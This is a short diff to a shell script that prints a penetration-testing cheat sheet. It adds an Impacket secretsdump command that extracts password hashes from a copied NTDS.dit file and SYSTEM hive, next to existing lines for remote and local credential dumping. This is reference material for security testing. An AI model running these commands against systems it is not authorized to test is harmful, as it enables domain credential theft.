@@ -41,6 +41,7 @@ echo -e ""
 echo -e "${Frame}###${End} ${Title}Impacket-SecretsDump${End} ${Frame}###${End}"
 echo -e "${Comment}Impacket's secretsdump.py will dump secrets from the remote machine without executing any agent.${End}"
 echo -e "${Point} impacket-secretsdump domain.local/\$admin_user:\$password@\$IP"
+echo -e "${Point} impacket-secretsdump -ntds ntds.dit -system system.save LOCAL"
 echo -e "${Point} impacket-secretsdump -ntds ntds.dit -sam sam.save -security security.save -system system.save LOCAL"
 echo -e ""
 
